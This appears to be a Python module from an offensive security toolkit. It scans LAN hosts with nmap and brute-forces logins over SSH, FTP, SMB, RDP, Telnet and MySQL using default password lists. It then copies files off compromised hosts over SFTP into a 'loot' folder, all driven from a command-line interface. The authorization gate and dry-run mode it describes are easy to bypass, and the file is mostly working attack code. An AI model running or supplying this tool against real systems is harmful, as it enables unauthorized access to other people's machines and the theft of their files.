"""Tier A network offense (Pi/LAN, Bjorn-style): gated nmap recon + multi-protocol
credential brute-force (SSH/FTP/SMB/RDP/Telnet/SQL) + SSH file-steal. Every action
authorizes the HOST through kuma_core.authz.Gate BEFORE any packet is sent. The nmap
runner, per-protocol attempters, and the SFTP stealer are INJECTED so this is unit-
testable without targets or the heavy deps; real implementations lazy-import
paramiko/impacket/pymysql (and use a raw socket for telnet) only at attempt time.
Untargeted scanning is impossible: the gate denies any host not in approved_targets/
auto-hostiles.
"""
from __future__ import annotations

from dataclasses import dataclass, field

DEFAULT_PORTS = {"ssh": 22, "ftp": 21, "smb": 445, "rdp": 3389,
                 "telnet": 23, "sql": 3306}

# Small, lab-proof default credential lists. Override via lab_targets
# bruteforce.userlist / bruteforce.passlist (paths to bigger wordlists).
DEFAULT_USERS = ["root", "admin", "user", "pi", "administrator", "guest"]
DEFAULT_PASSWORDS = ["root", "admin", "password", "toor", "raspberry",
                     "123456", "admin123", "", "guest"]


def _read_list(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return [ln.strip() for ln in fh if ln.strip()]


def load_wordlists(cfg: dict | None = None) -> tuple[list[str], list[str]]:
    users, passwords = list(DEFAULT_USERS), list(DEFAULT_PASSWORDS)
    bf = (cfg or {}).get("bruteforce", {})
    if bf.get("userlist"):
        users = _read_list(bf["userlist"])
    if bf.get("passlist"):
        passwords = _read_list(bf["passlist"])
    return users, passwords


# ---------------------------------------------------------------------------
# Result dataclasses
# ---------------------------------------------------------------------------

@dataclass
class BruteResult:
    ok: bool
    reason: str
    proto: str
    host: str
    found: list = field(default_factory=list)   # list[tuple[str, str]]
    attempts: int = 0
    dry_run: bool = False


@dataclass
class ScanResult:
    ok: bool
    reason: str
    host: str
    open_ports: list = field(default_factory=list)
    dry_run: bool = False
    detail: str = ""


@dataclass
class StealResult:
    ok: bool
    reason: str
    host: str
    files: list = field(default_factory=list)
    dry_run: bool = False


# ---------------------------------------------------------------------------
# Protocol attempters (lazy imports — heavy deps inside function bodies only)
# ---------------------------------------------------------------------------

def _ssh_try(host, port, user, pwd, timeout):
    import paramiko  # lazy
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(host, port=port, username=user, password=pwd, timeout=timeout,
                  allow_agent=False, look_for_keys=False, banner_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False
    finally:
        try:
            c.close()
        except Exception:
            pass


def _ftp_try(host, port, user, pwd, timeout):
    import ftplib  # stdlib
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=timeout)
        ftp.login(user, pwd)
        ftp.quit()
        return True
    except Exception:
        return False
    finally:
        try:
            ftp.close()
        except Exception:
            pass


def _telnet_success(resp: bytes) -> bool:
    """Decide whether a telnet response looks like a successful login.

    WARNING: This heuristic is fragile. A non-empty response containing a
    '$'-like prompt that lacks obvious failure keywords is treated as success.
    False positives are possible (e.g. a server that echoes '$' in an error
    banner). Positive results MUST be manually verified before acting on them.
    """
    if len(resp) <= 4:
        return False
    low = resp.lower()
    return (b"incorrect" not in low
            and b"failed" not in low
            and b"login:" not in low)


def _telnet_try(host, port, user, pwd, timeout):
    # telnetlib was removed in Python 3.13; do a minimal raw-socket login.
    import socket
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except Exception:
        return False
    try:
        s.settimeout(timeout)

        def _read_until(token: bytes) -> bytes:
            buf = b""
            try:
                while token not in buf.lower():
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    buf += chunk
            except socket.timeout:
                pass
            return buf

        _read_until(b"login:")
        s.sendall(user.encode() + b"\r\n")
        _read_until(b"password:")
        s.sendall(pwd.encode() + b"\r\n")
        resp = _read_until(b"$")  # crude: a shell prompt suggests success
        return _telnet_success(resp)
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def _smb_try(host, port, user, pwd, timeout):
    from impacket.smbconnection import SMBConnection  # lazy
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
        conn.login(user, pwd)
        conn.logoff()
        return True
    except Exception:
        return False


def _rdp_try(host, port, user, pwd, timeout, runner=None):
    # Uses xfreerdp /auth-only (exit 0 == valid creds). runner injectable for tests.
    import subprocess
    cmd = ["xfreerdp", f"/v:{host}:{port}", f"/u:{user}", f"/p:{pwd}",
           "/auth-only", "/cert:ignore"]
    run = runner or (lambda: subprocess.run(
        cmd, capture_output=True, timeout=timeout + 5).returncode)
    try:
        return run() == 0
    except Exception:
        return False


def _sql_try(host, port, user, pwd, timeout):
    import pymysql  # lazy (MySQL/MariaDB)
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=pwd,
                               connect_timeout=int(timeout))
        conn.close()
        return True
    except Exception:
        return False


# Real registry — defined BEFORE NetworkOffense so __init__ captures it correctly.
ATTEMPTERS = {
    "ssh": _ssh_try, "ftp": _ftp_try, "smb": _smb_try,
    "rdp": _rdp_try, "telnet": _telnet_try, "sql": _sql_try,
}


# ---------------------------------------------------------------------------
# nmap helpers
# ---------------------------------------------------------------------------

def parse_nmap_ports(output: str) -> list[int]:
    ports = []
    for line in output.splitlines():
        line = line.strip()
        if "/tcp" in line and " open" in line:
            try:
                ports.append(int(line.split("/", 1)[0]))
            except ValueError:
                continue
    return ports


def _nmap_scan(host, ports, timeout):
    import subprocess
    out = subprocess.run(
        ["nmap", "-Pn", "-T4", "-p", ports, host],
        capture_output=True, text=True, timeout=timeout).stdout
    return parse_nmap_ports(out)


# ---------------------------------------------------------------------------
# SFTP stealer
# ---------------------------------------------------------------------------

def _loot_path(out_dir, host: str, remote_path: str):
    """Compute a safe local destination for a stolen file.

    Returns a resolved Path inside *out_dir*, or None if the computed path
    would escape the loot directory (path-traversal guard).
    """
    from pathlib import Path
    base = Path(out_dir).resolve()
    candidate = (base / (host.replace(".", "_") + "_" + Path(remote_path).name)).resolve()
    if not str(candidate).startswith(str(base)):
        return None
    return candidate


def _sftp_get(host, port, user, pwd, remote_paths, out_dir, timeout):
    import paramiko  # lazy
    from pathlib import Path
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    t = paramiko.Transport((host, port))
    got = []
    try:
        t.connect(username=user, password=pwd)
        sftp = paramiko.SFTPClient.from_transport(t)
        for rp in remote_paths:
            local = _loot_path(out_dir, host, rp)
            if local is None:
                continue  # refuse to write outside the loot dir
            sftp.get(rp, str(local))
            got.append(rp)
    finally:
        t.close()
    return got


# ---------------------------------------------------------------------------
# NetworkOffense orchestrator
# ---------------------------------------------------------------------------

class NetworkOffense:
    def __init__(self, gate, *, attempters=None, scanner=None, stealer=None,
                 dry_run: bool = False) -> None:
        self.gate = gate
        # Injection wins; fall back to the real ATTEMPTERS registry (defined above).
        self.attempters = attempters if attempters is not None else dict(ATTEMPTERS)
        self._scanner = scanner
        self._stealer = stealer
        self.dry_run = dry_run

    def bruteforce(self, host: str, proto: str, *, port: int | None = None,
                   users=None, passwords=None, timeout: float = 4.0,
                   stop_on_success: bool = True, cfg: dict | None = None) -> BruteResult:
        proto = proto.lower()
        if proto not in self.attempters:
            return BruteResult(False, f"unknown proto: {proto}", proto, host)
        allowed, why = self.gate.is_authorized(host, f"brute_{proto}")
        if not allowed:
            return BruteResult(False, why, proto, host)
        if users is None or passwords is None:
            du, dp = load_wordlists(cfg)
            users = users or du
            passwords = passwords or dp
        port = port or DEFAULT_PORTS.get(proto, 0)
        if self.dry_run:
            return BruteResult(True, "dry-run (no tx)", proto, host, dry_run=True)
        attempt = self.attempters[proto]
        found, n = [], 0
        for user in users:
            for pwd in passwords:
                n += 1
                try:
                    hit = attempt(host, port, user, pwd, timeout)
                except Exception:  # a single failed attempt must not abort the run
                    hit = False
                if hit:
                    found.append((user, pwd))
                    if stop_on_success:
                        self.gate.audit({"tier": "A", "action": f"brute_{proto}",
                                         "target": host, "allowed": True,
                                         "reason": f"creds found in {n} attempts"})
                        return BruteResult(True, why, proto, host, found, n)
        self.gate.audit({"tier": "A", "action": f"brute_{proto}", "target": host,
                         "allowed": True,
                         "reason": f"{len(found)} creds in {n} attempts"})
        return BruteResult(True, why if found else "no creds found",
                           proto, host, found, n)

    def scan(self, host: str, ports: str = "1-1024", timeout: float = 120.0) -> ScanResult:
        allowed, why = self.gate.is_authorized(host, "scan")
        if not allowed:
            return ScanResult(False, why, host)
        if self.dry_run:
            return ScanResult(True, "dry-run (no tx)", host, dry_run=True,
                              detail=f"would nmap {host} ports {ports}")
        runner = self._scanner or _nmap_scan
        open_ports = runner(host, ports, timeout)
        self.gate.audit({"tier": "A", "action": "scan", "target": host,
                         "allowed": True, "reason": f"{len(open_ports)} open ports"})
        return ScanResult(True, why, host, open_ports,
                          detail=f"{len(open_ports)} open")

    def steal_ssh(self, host: str, user: str, pwd: str, remote_paths,
                  out_dir=None, port: int = 22, timeout: float = 10.0) -> StealResult:
        from kuma_core.config import DATA_DIR
        allowed, why = self.gate.is_authorized(host, "steal")
        if not allowed:
            return StealResult(False, why, host)
        if self.dry_run:
            return StealResult(True, "dry-run (no tx)", host, dry_run=True)
        out = out_dir or (DATA_DIR / "loot")
        stealer = self._stealer or _sftp_get
        try:
            files = stealer(host, port, user, pwd, remote_paths, out, timeout)
        except Exception as e:  # noqa: BLE001
            return StealResult(False, f"steal error: {e}", host)
        self.gate.audit({"tier": "A", "action": "steal", "target": host,
                         "allowed": True, "reason": f"{len(files)} files"})
        return StealResult(True, why, host, files)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.net_offense",
        description="Kuroshuna Tier A network offense: gated scan/brute/steal.")
    p.add_argument("--host", required=True, help="target host/IP (must be authorized)")
    p.add_argument("--scan", action="store_true", help="nmap port scan")
    p.add_argument("--brute", metavar="PROTO",
                   help="brute one of: " + ",".join(DEFAULT_PORTS))
    p.add_argument("--steal", nargs="+", metavar="REMOTE_PATH",
                   help="SFTP-steal paths (needs --user/--pass)")
    p.add_argument("--user", default="root")
    p.add_argument("--passwd", default="root")
    p.add_argument("--ports", default="1-1024")
    p.add_argument("--no-tx", dest="no_tx", action="store_true",
                   help="dry run: authorize but never connect")
    return p.parse_args(argv)


def run_cli(args, no=None) -> int:
    if not (args.scan or args.brute or args.steal):
        print("error: specify --scan, --brute PROTO, and/or --steal PATH...", flush=True)
        return 2
    if no is None:
        from kuma_core.authz import Gate
        no = NetworkOffense(gate=Gate(), dry_run=args.no_tx)
    rc = 0
    if args.scan:
        r = no.scan(args.host, ports=args.ports)
        print(f"[scan] ok={r.ok} {r.reason} open={r.open_ports} {r.detail}", flush=True)
        rc = rc or (0 if r.ok else 1)
    if args.brute:
        r = no.bruteforce(args.host, args.brute)
        print(f"[brute:{args.brute}] ok={r.ok} {r.reason} found={r.found} "
              f"attempts={r.attempts}{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)
    if args.steal:
        r = no.steal_ssh(args.host, args.user, args.passwd, args.steal)
        print(f"[steal] ok={r.ok} {r.reason} files={r.files}"
              f"{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
